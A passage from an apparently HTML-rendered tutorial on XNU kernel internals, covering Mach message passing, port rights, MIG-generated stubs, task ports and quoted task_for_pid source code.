    	<span class="n">mach_msg_header_t</span> <span class="n">header</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">body</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="p">}</span> <span class="n">message</span>

    <span class="k">struct</span> <span class="n">message</span> <span class="n">message</span><span class="p">;</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">message</span><span class="p">.</span><span class="n">body</span><span class="p">,</span> <span class="s">"Hello World !</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_remote_port</span> <span class="o">=</span> <span class="n">port</span><span class="p">;</span> <span class="cm">/*Destination Port*/</span>
    <span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_local_port</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_bits</span> <span class="o">=</span> <span class="n">MACH_MSGH_BITS</span><span class="p">(</span><span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">.</span><span class="n">msgh_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">mach_msg</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">,</span>			<span class="cm">/* The header */</span>
    	    	  <span class="n">MACH_SEND_MSG</span><span class="p">,</span>	<span class="cm">/* Flags */</span>
    		      <span class="k">sizeof</span> <span class="p">(</span><span class="n">message</span><span class="p">),</span>			<span class="cm">/* Send size */</span>
    		      <span class="mi">0</span><span class="p">,</span>			<span class="cm">/* Max receive Size */</span>
    		      <span class="n">port</span><span class="p">,</span>				<span class="cm">/* Receive port */</span>
    		      <span class="n">MACH_MSG_TIMEOUT_NONE</span><span class="p">,</span>		<span class="cm">/* No timeout */</span>
    		      <span class="n">MACH_PORT_NULL</span><span class="p">);</span>			<span class="cm">/* No notification */</span></code></pre></figure>

<p>And can be received with <strong>mach_msg</strong></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="n">mach_port_t</span> <span class="n">receive</span><span class="p">;</span>

    <span class="n">err</span> <span class="o">=</span> <span class="n">mach_port_allocate</span> <span class="p">(</span><span class="n">mach_task_self</span> <span class="p">(),</span>
           		      	    <span class="n">MACH_PORT_RIGHT_RECEIVE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">receive</span><span class="p">);</span>

    <span class="n">err</span> <span class="o">=</span> <span class="n">mach_msg</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">message</span><span class="p">.</span><span class="n">header</span><span class="p">,</span><span class="cm">/* The header */</span>
          <span class="n">MACH_RCV_MSG</span><span class="p">,</span>	<span class="cm">/* Flags */</span>
          <span class="mi">0</span><span class="p">,</span> <span class="cm">/* Send size */</span>
    	  <span class="k">sizeof</span> <span class="p">(</span><span class="n">message</span><span class="p">),</span><span class="cm">/* Max receive size */</span>
          <span class="n">receive</span><span class="p">,</span>	<span class="cm">/* Receive port */</span>
          <span class="n">MACH_MSG_TIMEOUT_NONE</span><span class="p">,</span> <span class="cm">/* No timeout */</span>
          <span class="n">MACH_PORT_NULL</span><span class="p">);</span><span class="cm">/* No notification */</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">EXPORT_HDRS</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">message</span><span class="p">.</span><span class="n">h</span>
    <span class="mi">0959</span><span class="o">:</span> <span class="cm">/*
    0960:  *	Routine:	mach_msg_overwrite
    0961:  *	Purpose:
    0962:  *		Send and/or receive a message.  If the message operation
    0963:  *		is interrupted, and the user did not request an indication
    0964:  *		of that fact, then restart the appropriate parts of the
    0965:  *		operation silently (trap version does not restart).
    0966:  *
    0967:  *		Distinct send and receive buffers may be specified.  If
    0968:  *		no separate receive buffer is specified, the msg parameter
    0969:  *		will be used for both send and receive operations.
    0970:  *
    0971:  *		In addition to a distinct receive buffer, that buffer may
    0972:  *		already contain scatter control information to direct the
    0973:  *		receiving of the message.
    0974:  */</span>
    <span class="mi">0975</span><span class="o">:</span> <span class="n">__WATCHOS_PROHIBITED</span> <span class="n">__TVOS_PROHIBITED</span>
    <span class="mi">0976</span><span class="o">:</span> <span class="k">extern</span> <span class="n">mach_msg_return_t</span>	<span class="nf">mach_msg_overwrite</span><span class="p">(</span>
    <span class="mi">0977</span><span class="o">:</span> 					<span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span>
    <span class="mi">0978</span><span class="o">:</span> 					<span class="n">mach_msg_option_t</span> <span class="n">option</span><span class="p">,</span>
    <span class="mi">0979</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">send_size</span><span class="p">,</span>
    <span class="mi">0980</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">rcv_size</span><span class="p">,</span>
    <span class="mi">0981</span><span class="o">:</span> 					<span class="n">mach_port_name_t</span> <span class="n">rcv_name</span><span class="p">,</span>
    <span class="mi">0982</span><span class="o">:</span> 					<span class="n">mach_msg_timeout_t</span> <span class="n">timeout</span><span class="p">,</span>
    <span class="mi">0983</span><span class="o">:</span> 					<span class="n">mach_port_name_t</span> <span class="n">notify</span><span class="p">,</span>
    <span class="mi">0984</span><span class="o">:</span> 					<span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">rcv_msg</span><span class="p">,</span>
    <span class="mi">0985</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">rcv_limit</span><span class="p">);</span>
    <span class="mi">0986</span><span class="o">:</span> 
    <span class="mi">0987</span><span class="o">:</span> <span class="err">#</span><span class="n">ifndef</span>	<span class="n">KERNEL</span>
    <span class="mi">0988</span><span class="o">:</span> 
    <span class="mi">0989</span><span class="o">:</span> <span class="cm">/*
    0990:  *	Routine:	mach_msg
    0991:  *	Purpose:
    0992:  *		Send and/or receive a message.  If the message operation
    0993:  *		is interrupted, and the user did not request an indication
    0994:  *		of that fact, then restart the appropriate parts of the
    0995:  *		operation silently (trap version does not restart).
    0996:  */</span>
    <span class="mi">0997</span><span class="o">:</span> <span class="n">__WATCHOS_PROHIBITED</span> <span class="n">__TVOS_PROHIBITED</span>
    <span class="mi">0998</span><span class="o">:</span> <span class="k">extern</span> <span class="n">mach_msg_return_t</span>	<span class="nf">mach_msg</span><span class="p">(</span>
    <span class="mi">0999</span><span class="o">:</span> 					<span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span>
    <span class="mi">1000</span><span class="o">:</span> 					<span class="n">mach_msg_option_t</span> <span class="n">option</span><span class="p">,</span>
    <span class="mi">1001</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">send_size</span><span class="p">,</span>
    <span class="mi">1002</span><span class="o">:</span> 					<span class="n">mach_msg_size_t</span> <span class="n">rcv_size</span><span class="p">,</span>
    <span class="mi">1003</span><span class="o">:</span> 					<span class="n">mach_port_name_t</span> <span class="n">rcv_name</span><span class="p">,</span>
    <span class="mi">1004</span><span class="o">:</span> 					<span class="n">mach_msg_timeout_t</span> <span class="n">timeout</span><span class="p">,</span>
    <span class="mi">1005</span><span class="o">:</span> 					<span class="n">mach_port_name_t</span> <span class="n">notify</span><span class="p">);</span>
    <span class="mi">1006</span><span class="o">:</span> </code></pre></figure>

<p>If you have a send right to a port, you can insert that send right into another task using <strong>mach_port_insert_right</strong> and then sending the message using <strong>mach_msg</strong>. As discussed before, <strong>mach_port_name_t</strong> is meanigless outside a task’s namespace, this is why the task (ipc_space_t) needs to be specified along with the <strong>mach_port_name_t</strong> so that the kernel can put the specified name (mach_port_name_t) into that task’s namespace.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     *	Inserts the specified rights into the target task,
     *	using the specified name.  If inserting send/receive
     *	rights and the task already has send/receive rights
     *	for the port, then the names must agree.In any case,
     *	the task gains a user ref for the port.
     */</span>

    <span class="cp">#ifdef	mig_external
</span>    <span class="n">mig_external</span>
    <span class="cp">#else
</span>    <span class="k">extern</span>
    <span class="cp">#endif	</span><span class="cm">/* mig_external */</span><span class="cp">
</span>    <span class="n">kern_return_t</span> <span class="nf">mach_port_insert_right</span>
    <span class="p">(</span>
    	<span class="n">ipc_space_t</span> <span class="n">task</span><span class="p">,</span>
    	<span class="n">mach_port_name_t</span> <span class="n">name</span><span class="p">,</span>
    	<span class="n">mach_port_t</span> <span class="n">poly</span><span class="p">,</span>
    	<span class="n">mach_msg_type_name_t</span> <span class="n">polyPoly</span>
    <span class="p">);</span><span class="n">z</span>

    <span class="n">kr</span> <span class="o">=</span> <span class="n">mach_port_insert_right</span><span class="p">(</span><span class="n">receiver_task</span><span class="p">,</span> <span class="mh">0x1234</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span>
    <span class="n">MACH_MSG_TYPE_MOVE_SEND</span><span class="p">);</span></code></pre></figure>

<h2 id="mig---mach-interface-generator">MIG - Mach Interface Generator</h2>

<p>A lot of the code written using Mach APIs involves the same boilerplate code, doing which many times might cause complications and even lead to security flaws, and this is where the Mach Interface Generator comes in very handy. It implements a stub function based on a MIG specification file (defs). The client can call this stub function just like any other C function call, and the stub function handles marshaling and un-marshaling data in and out of the mach messages, thereby controlling all the Mach IPC implementation happening underneath.</p>

<p>MIG’s specification files have the extension <strong>defs</strong>, and when the kernel is compiled, these files get processed by mig and result in addition of extra files, which contains the autogenerated MIG wrappers. For e.g, let’s have a look at the task.defs file in <strong>osfmk/mach/task.defs</strong>. As you can see, each defs file has a subsystem name followed by an arbitrary number, which is declared at the very beginning of the file. In this case, the subsystem name is task and is the number is 3400. The stub function may also check the validity of the arguments that are passed to it.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span><span class="o">/</span><span class="n">COMPILE_KERNEL</span><span class="o">/</span><span class="n">xnu</span><span class="o">-</span><span class="mi">4570</span><span class="p">.</span><span class="mi">41</span><span class="p">.</span><span class="mi">2</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">defs</span>
    <span class="mi">65</span><span class="o">:</span> <span class="n">subsystem</span>
    <span class="mi">66</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">KERNEL_SERVER</span>
    <span class="mi">67</span><span class="o">:</span>     <span class="n">KernelServer</span>
    <span class="mi">68</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>  <span class="cm">/* KERNEL_SERVER */</span>
    <span class="mi">69</span><span class="o">:</span>     <span class="n">task</span> <span class="mi">3400</span><span class="p">;</span>
    <span class="mi">70</span><span class="o">:</span> 
    <span class="mi">71</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mi">72</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mi">73</span><span class="o">:</span> <span class="err">#</span><span class="n">include</span> 
    <span class="mi">74</span><span class="o">:</span> 
    <span class="mi">75</span><span class="o">:</span> <span class="cm">/*
    76:  *  Create a new task with an empty set of IPC rights,
    77:  *  and having an address space constructed from the
    78:  *  target task (or empty, if inherit_memory is FALSE).
    79:  */</span>
    <span class="mi">80</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_create</span><span class="p">(</span>
    <span class="mi">81</span><span class="o">:</span>     <span class="n">target_task</span> <span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">82</span><span class="o">:</span>     <span class="n">ledgers</span>   <span class="o">:</span> <span class="n">ledger_array_t</span><span class="p">;</span>
    <span class="mi">83</span><span class="o">:</span>     <span class="n">inherit_memory</span>  <span class="o">:</span> <span class="n">boolean_t</span><span class="p">;</span>
    <span class="mi">84</span><span class="o">:</span>   <span class="n">out</span> <span class="n">child_task</span>  <span class="o">:</span> <span class="n">task_t</span><span class="p">);</span>
    <span class="mi">85</span><span class="o">:</span> 
    <span class="mi">86</span><span class="o">:</span> <span class="o">/*</span>
    <span class="mi">87</span><span class="o">:</span>  <span class="o">*</span>  <span class="n">Destroy</span> <span class="n">the</span> <span class="n">target</span> <span class="n">task</span><span class="p">,</span> <span class="n">causing</span> <span class="n">all</span> <span class="n">of</span> <span class="n">its</span> <span class="n">threads</span></code></pre></figure>

<p>If you want to generate the MIG wrappers, you can simple run mig on any def file from a clean directory.</p>

<p><img src="/images/16.png" alt="16" /></p>

<p>During compilation, the <strong>mig</strong> tool creates three files based on the subsystem name. For e.g, for the task subsystem, the following files are created</p>

<ul>
  <li><strong>taskUser.c</strong> - This file contains the implementations for the proxy functions which is responsible for marshalling the data into a message and sending it. It is also responsible for unmarshalling the returned data and getting it sent back to the client.</li>
  <li><strong>task.c</strong> - Prototype for the proxy functions</li>
  <li><strong>taskServer.c</strong> - Implementations for the stub functions are contained in this file.</li>
</ul>

<p>There are many <strong>routines</strong> defined in the generated file and these are basically the functions. Let’s look at one specific Mach API <strong>routine task_set_exception_ports</strong> and have a look at the auto-generated MIG code.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span><span class="o">/</span><span class="n">COMPILE_KERNEL</span><span class="o">/</span><span class="n">xnu</span><span class="o">-</span><span class="mi">4903</span><span class="p">.</span><span class="mi">221</span><span class="p">.</span><span class="mi">2</span><span class="o">/</span><span class="n">BUILD</span><span class="o">/</span><span class="n">obj</span><span class="o">/</span><span class="n">RELEASE_X86_64</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">RELEASE</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task_server</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">1697</span><span class="o">:</span> <span class="cm">/* Routine task_set_exception_ports */</span>
    <span class="mi">1698</span><span class="o">:</span> <span class="n">mig_internal</span> <span class="n">novalue</span> <span class="n">_Xtask_set_exception_ports</span>
    <span class="mi">1699</span><span class="o">:</span>   <span class="p">(</span><span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">InHeadP</span><span class="p">,</span> <span class="n">mach_msg_header_t</span> <span class="o">*</span><span class="n">OutHeadP</span><span class="p">)</span>
    <span class="mi">1700</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">1701</span><span class="o">:</span> 
    <span class="mi">1702</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">1703</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
    <span class="mi">1704</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">1705</span><span class="o">:</span>   <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
    <span class="mi">1706</span><span class="o">:</span>     <span class="n">mach_msg_header_t</span> <span class="n">Head</span><span class="p">;</span>
    <span class="mi">1707</span><span class="o">:</span>     <span class="cm">/* start of the kernel processed data */</span>
    <span class="mi">1708</span><span class="o">:</span>     <span class="n">mach_msg_body_t</span> <span class="n">msgh_body</span><span class="p">;</span>
    <span class="mi">1709</span><span class="o">:</span>     <span class="n">mach_msg_port_descriptor_t</span> <span class="n">new_port</span><span class="p">;</span>
    <span class="mi">1710</span><span class="o">:</span>     <span class="cm">/* end of the kernel processed data */</span>
    <span class="mi">1711</span><span class="o">:</span>     <span class="n">NDR_record_t</span> <span class="n">NDR</span><span class="p">;</span>
    <span class="mi">1712</span><span class="o">:</span>     <span class="n">exception_mask_t</span> <span class="n">exception_mask</span><span class="p">;</span>
    <span class="mi">1713</span><span class="o">:</span>     <span class="n">exception_behavior_t</span> <span class="n">behavior</span><span class="p">;</span>
    <span class="mi">1714</span><span class="o">:</span>     <span class="n">thread_state_flavor_t</span> <span class="n">new_flavor</span><span class="p">;</span>
    <span class="mi">1715</span><span class="o">:</span>     <span class="n">mach_msg_trailer_t</span> <span class="n">trailer</span><span class="p">;</span>
    <span class="mi">1716</span><span class="o">:</span>   <span class="p">}</span> <span class="n">Request</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">1717</span><span class="o">:</span> <span class="err">#</span><span class="n">ifdef</span>  <span class="n">__MigPackStructs</span>
    <span class="mi">1718</span><span class="o">:</span> <span class="err">#</span><span class="n">pragma</span> <span class="n">pack</span><span class="p">()</span>
    <span class="mi">1719</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">1720</span><span class="o">:</span>   <span class="k">typedef</span> <span class="n">__Request__task_set_exception_ports_t</span> <span class="n">__Request</span><span class="p">;</span>
    <span class="mi">1721</span><span class="o">:</span>   <span class="k">typedef</span> <span class="n">__Reply__task_set_exception_ports_t</span> <span class="n">Reply</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">unused</span><span class="p">));</span>
    <span class="mi">1722</span><span class="o">:</span> </code></pre></figure>

<p>It’s quite important to audit the code in these functions as well. In the next article, we will discuss a vulnerability identified in the autogenerated MIG code obtained after building the kernel.</p>

<h2 id="task-ports">Task Ports</h2>

<p>One of the other useful features of Mach Ports is that they serve as an abstraction over Objects, and the abstraction is provided by Mach Messages which mostly translate over MIG. For example, the Host Mach ports provide many APIs to get information about the host. The <strong>host_kernel_version()</strong> function will print out the kernel version. This is the same API used by the <strong>uname -r</strong> command. Looking at the file <strong>osfmk/mach/mach_host.defs</strong> will show all the routines provided by the host port APIs.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">mach_host</span><span class="p">.</span><span class="n">defs</span>
    <span class="mi">087</span><span class="o">:</span> <span class="cm">/*
    088:  *	Return information about this host.
    089:  */</span>
    <span class="mi">090</span><span class="o">:</span> <span class="n">routine</span> <span class="n">host_info</span><span class="p">(</span>
    <span class="mi">091</span><span class="o">:</span> 		<span class="n">host</span>		<span class="o">:</span> <span class="n">host_t</span><span class="p">;</span>
    <span class="mi">092</span><span class="o">:</span> 		<span class="n">flavor</span>		<span class="o">:</span> <span class="n">host_flavor_t</span><span class="p">;</span>
    <span class="mi">093</span><span class="o">:</span> 	<span class="n">out</span>	<span class="n">host_info_out</span>	<span class="o">:</span> <span class="n">host_info_t</span><span class="p">,</span> <span class="n">CountInOut</span><span class="p">);</span>
    <span class="mi">094</span><span class="o">:</span> 
    <span class="mi">095</span><span class="o">:</span> <span class="cm">/*
    096:  *	Get string describing current kernel version.
    097:  */</span>
    <span class="mi">098</span><span class="o">:</span> <span class="n">routine</span>	<span class="n">host_kernel_version</span><span class="p">(</span>
    <span class="mi">099</span><span class="o">:</span> 		<span class="n">host</span>		<span class="o">:</span> <span class="n">host_t</span><span class="p">;</span>
    <span class="mi">100</span><span class="o">:</span> 	<span class="n">out</span>	<span class="n">kernel_version</span>	<span class="o">:</span> <span class="n">kernel_version_t</span><span class="p">);</span>
    <span class="mi">101</span><span class="o">:</span> 
    <span class="mi">102</span><span class="o">:</span> <span class="cm">/*
    103:  *      Get host page size
    104:  *	(compatibility for running old libraries on new kernels -
    105:  *	host_page_size() is now a library routine based on constants)
    106:  */</span>
    <span class="mi">107</span><span class="o">:</span> <span class="err">#</span><span class="k">if</span> <span class="n">KERNEL</span>
    <span class="mi">108</span><span class="o">:</span> <span class="n">routine</span> <span class="n">host_page_size</span><span class="p">(</span>
    <span class="mi">109</span><span class="o">:</span> <span class="err">#</span><span class="k">else</span>
    <span class="mi">110</span><span class="o">:</span> <span class="n">routine</span> <span class="n">_host_page_size</span><span class="p">(</span>
    <span class="mi">111</span><span class="o">:</span> <span class="err">#</span><span class="n">endif</span>
    <span class="mi">112</span><span class="o">:</span> 		<span class="n">host</span>		<span class="o">:</span> <span class="n">host_t</span><span class="p">;</span>
    <span class="mi">113</span><span class="o">:</span> 	<span class="n">out</span>	<span class="n">out_page_size</span>	<span class="o">:</span> <span class="n">vm_size_t</span><span class="p">);</span>
    <span class="mi">114</span><span class="o">:</span> </code></pre></figure>

<p>Similarly, the task ports serve as an abstraction over the task. The APIs can be found under <strong>osfmk/mach/task.defs</strong> or <strong>osfmk/mach/task.defs</strong> in the <strong>BUILD</strong> folder in the kernel.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="p">.</span><span class="o">/</span><span class="n">osfmk</span><span class="o">/</span><span class="n">mach</span><span class="o">/</span><span class="n">task</span><span class="p">.</span><span class="n">defs</span>
    <span class="mi">409</span><span class="o">:</span> <span class="cm">/*
    410:  * Read the selected state which is to be installed on new 
    411:  * threads in the task as they are created.
    412:  */</span>
    <span class="mi">413</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_get_state</span><span class="p">(</span>
    <span class="mi">414</span><span class="o">:</span> 		<span class="n">task</span>		<span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">415</span><span class="o">:</span> 		<span class="n">flavor</span>		<span class="o">:</span> <span class="n">thread_state_flavor_t</span><span class="p">;</span>
    <span class="mi">416</span><span class="o">:</span> 	<span class="n">out</span>	<span class="n">old_state</span>	<span class="o">:</span> <span class="n">thread_state_t</span><span class="p">,</span> <span class="n">CountInOut</span><span class="p">);</span>
    <span class="mi">417</span><span class="o">:</span>  
    <span class="mi">418</span><span class="o">:</span> <span class="cm">/*
    419:  * Set the selected state information to be installed on
    420:  * all subsequently created threads in the task.
    421:  */</span>
    <span class="mi">422</span><span class="o">:</span> <span class="n">routine</span>	<span class="n">task_set_state</span><span class="p">(</span>
    <span class="mi">423</span><span class="o">:</span> 		<span class="n">task</span>		<span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">424</span><span class="o">:</span> 		<span class="n">flavor</span>		<span class="o">:</span> <span class="n">thread_state_flavor_t</span><span class="p">;</span>
    <span class="mi">425</span><span class="o">:</span> 		<span class="n">new_state</span>	<span class="o">:</span> <span class="n">thread_state_t</span><span class="p">);</span>
    <span class="mi">426</span><span class="o">:</span> 
    <span class="mi">427</span><span class="o">:</span> <span class="cm">/*
    428:  * Change the task's physical footprint limit (in MB).
    429:  */</span>
    <span class="mi">430</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_set_phys_footprint_limit</span><span class="p">(</span>
    <span class="mi">431</span><span class="o">:</span> 		<span class="n">task</span>		<span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">432</span><span class="o">:</span> 		<span class="n">new_limit</span>	<span class="o">:</span> <span class="kt">int</span><span class="p">;</span>
    <span class="mi">433</span><span class="o">:</span> 	<span class="n">out</span> <span class="n">old_limit</span>	<span class="o">:</span> <span class="kt">int</span><span class="p">);</span>
    <span class="mi">434</span><span class="o">:</span> 
    <span class="mi">435</span><span class="o">:</span> <span class="n">routine</span> <span class="n">task_suspend2</span><span class="p">(</span>
    <span class="mi">436</span><span class="o">:</span> 		<span class="n">target_task</span> <span class="o">:</span> <span class="n">task_t</span><span class="p">;</span>
    <span class="mi">437</span><span class="o">:</span> 	<span class="n">out</span> <span class="n">suspend_token</span> <span class="o">:</span> <span class="n">task_suspension_token_t</span><span class="p">);</span>
    <span class="mi">438</span><span class="o">:</span> 
    <span class="mi">439</span><span class="o">:</span> <span class="n">routine</span> <span class="nf">task_resume2</span><span class="p">(</span>
    <span class="mi">440</span><span class="o">:</span> 		<span class="n">suspend_token</span> <span class="o">:</span> <span class="n">task_suspension_token_t</span><span class="p">);</span>
    <span class="mi">441</span><span class="o">:</span> </code></pre></figure>

<p>These APIs are quite powerful and allow full interaction with the target task. Having a send right to the task port of a process will give full control over that task, which includes reading, writing and allocating of memory in the target tasks memory region. Btw, we are mentioning Task (coming from Mach) ports of a process (coming from BSD), this might seem wierd and it is important to note that while these are 2 different flavours of Mach, they are internally linked. Every associated BSD process has a corresponding Mach task and vice versa. The task struct can be found under <strong>osfmk/kern/task.h</strong> , this has a <strong>bsd_info</strong> field which is a pointer to the <strong>proc</strong> structure in <strong>bsd/sys/proc_internal.h</strong>. Similarly, the task field in the proc structure is a pointer to the task structure of that process.</p>

<p><img src="/images/21.png" alt="21" /></p>

<p>Using the Mach Trap <strong>task_for_pid</strong>, it is possible to get a send right to the task port corresponding to the target PID to the caller. As can be seen from the comments below in the implementation in the file <strong>bsd/vm/vm_unix.c</strong>, it is only permitted to privileged processes or processes with the same user ID. Apart from being privileged, calling this API also requires certain entitlements (<strong>get-task-allow</strong> and <strong>task_for_pid-allow</strong>).</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="nl">File:</span> <span class="o">/</span><span class="n">bsd</span><span class="o">/</span><span class="n">vm</span><span class="o">/</span><span class="n">vm_unix</span><span class="p">.</span><span class="n">c</span>
    <span class="mi">749</span><span class="o">:</span> <span class="cm">/*
    750:  *	Routine:	task_for_pid
    751:  *	Purpose:
    752:  *		Get the task port for another "process", named by its
    753:  *		process ID on the same host as "target_task".
    754:  *
    755:  *		Only permitted to privileged processes, or processes
    756:  *		with the same user ID.
    757:  *
    758:  *		Note: if pid == 0, an error is return no matter who is calling.
    759:  *
    760:  * XXX This should be a BSD system call, not a Mach trap!!!
    761:  */</span>
    <span class="mi">762</span><span class="o">:</span> <span class="n">kern_return_t</span>
    <span class="mi">763</span><span class="o">:</span> <span class="n">task_for_pid</span><span class="p">(</span>
    <span class="mi">764</span><span class="o">:</span> 	<span class="k">struct</span> <span class="n">task_for_pid_args</span> <span class="o">*</span><span class="n">args</span><span class="p">)</span>
    <span class="mi">765</span><span class="o">:</span> <span class="p">{</span>
    <span class="mi">766</span><span class="o">:</span> 	<span class="n">mach_port_name_t</span>	<span class="n">target_tport</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">target_tport</span><span class="p">;</span>
    <span class="mi">767</span><span class="o">:</span> 	<span class="kt">int</span>			<span class="n">pid</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">;</span>
    <span class="mi">768</span><span class="o">:</span> 	<span class="n">user_addr_t</span>		<span class="n">task_addr</span> <span class="o">=</span> <span class="n">args</span><span class="o">-&gt;</span><span class="n">t</span><span class="p">;</span>
    <span class="mi">769</span><span class="o">:</span> 	<span class="n">proc_t</span> 			<span class="n">p</span> <span class="o">=</span> <span class="n">PROC_NULL</span><span class="p">;</span>
    <span class="mi">770</span><span class="o">:</span> 	<span class="n">task_t</span>			<span class="n">t1</span> <span class="o">=</span> <span class="n">TASK_NULL</span><span class="p">;</span>
    <span class="mi">771</span><span class="o">:</span> 	<span class="n">mach_port_name_t</span>	<span class="n">tret</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    <span class="mi">772</span><span class="o">:</span>  	<span class="n">ipc_port_t</span> 		<span class="n">tfpport</span><span class="p">;</span>
    <span class="mi">773</span><span class="o">:</span> 	<span class="kt">void</span> <span class="o">*</span> <span class="n">sright</span><span class="p">;</span>
    <span class="mi">774</span><span class="o">:</span> 	<span class="kt">int</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="mi">775</span><span class="o">:</span> 
    <span class="mi">776</span><span class="o">:</span> 	<span class="n">AUDIT_MACH_SYSCALL_ENTER</span><span class="p">(</span><span class="n">AUE_TASKFORPID</span><span class="p">);</span>
    <span class="mi">777</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="mi">778</span><span class="o">:</span> 	<span class="n">AUDIT_ARG</span><span class="p">(</span><span class="n">mach_port1</span><span class="p">,</span> <span class="n">target_tport</span><span class="p">);</span>
    <span class="mi">779</span><span class="o">:</span> 
    <span class="mi">780</span><span class="o">:</span> 	<span class="cm">/* Always check if pid == 0 */</span>
    <span class="mi">781</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="mi">782</span><span class="o">:</span> 		<span class="p">(</span><span class="kt">void</span> <span class="p">)</span> <span class="n">copyout</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">t1</span><span class="p">,</span> <span class="n">task_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_name_t</span><span class="p">));</span>
    <span class="mi">783</span><span class="o">:</span> 		<span class="n">AUDIT_MACH_SYSCALL_EXIT</span><span class="p">(</span><span class="n">KERN_FAILURE</span><span class="p">);</span>
    <span class="mi">784</span><span class="o">:</span> 		<span class="k">return</span><span class="p">(</span><span class="n">KERN_FAILURE</span><span class="p">);</span>
    <span class="mi">785</span><span class="o">:</span> 	<span class="p">}</span>
    <span class="mi">786</span><span class="o">:</span> 
    <span class="mi">787</span><span class="o">:</span> 	<span class="n">t1</span> <span class="o">=</span> <span class="n">port_name_to_task</span><span class="p">(</span><span class="n">target_tport</span><span class="p">);</span>
    <span class="mi">788</span><span class="o">:</span> 	<span class="k">if</span> <span class="p">(</span><span class="n">t1</span> <span class="o">==</span> <span class="n">TASK_NULL</span><span class="p">)</span> <span class="p">{</span>
